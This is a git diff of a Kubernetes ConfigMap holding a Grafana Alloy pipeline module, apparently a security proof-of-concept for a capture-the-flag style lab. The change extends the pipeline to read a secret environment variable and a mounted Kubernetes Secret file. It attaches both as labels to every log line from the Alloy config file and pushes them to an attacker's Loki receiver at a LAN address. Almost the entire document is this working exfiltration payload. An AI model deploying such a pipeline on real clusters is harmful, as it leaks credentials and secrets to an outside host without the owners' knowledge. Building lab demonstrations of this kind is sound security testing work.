@@ -4,18 +4,27 @@ metadata:
   name: user-pipeline
   namespace: monitoring
 data:
-  # Demo: exfiltrate /etc/alloy/config.alloy (which contains SECRET_1 via env
-  # var and the full pipeline config) to the attacker's local loki receiver.
+  # Demo: exfiltrate both Flag 1 (env var) and Flag 2 (mounted Secret file)
+  # as labels on every log line read from /etc/alloy/config.alloy.
   #
-  # Run: task deploy:security-poc:flag1-demo
+  # - Flag 1 comes from sys.env("SECRET_1") — env var injected via extraEnv.
+  # - Flag 2 comes from local.file, which reads the mounted Secret as a string
+  #   (avoids the no-newline issue that breaks loki.source.file line splitting).
+  #
+  # Run: task deploy:security-poc:flag1and2-demo
   # Then in a separate terminal: task run:security-poc-loki-receiver
   #
   # TIMESTAMP is replaced with $(date +%s) by the task on every apply,
   # giving each run a unique positions-file key so the file is always re-read.
   module.alloy: |
     declare "user_pipeline" {
-      // Read the Alloy main config file. It contains the full pipeline config
-      // and any secrets baked in via env var references or extraEnv values.
+      // Read the mounted Kubernetes Secret as a raw string value.
+      // Avoids the no-trailing-newline problem of loki.source.file on Secret files.
+      local.file "secret_2" {
+        filename = "/etc/security-poc/SECRET_2"
+      }
+
+      // Read the Alloy main config file line by line.
       loki.source.file "exfil" {
         targets = [{
           __path__ = "/etc/alloy/config.alloy",
@@ -25,14 +34,14 @@ data:
       }
 
       // Ship every line to the attacker's local receiver.
-      // host.docker.internal is NOT injected into kind pod /etc/hosts on macOS;
-      // use the Mac's LAN IP instead (reachable via the Docker bridge route).
+      // Both secrets travel as labels on every log entry.
       loki.write "exfil" {
         endpoint {
           url = "http://192.168.0.154:3100/loki/api/v1/push"
         }
         external_labels = {
           demo_1 = sys.env("SECRET_1"),
+          demo_2 = local.file.secret_2.content,
         }
       }
     }
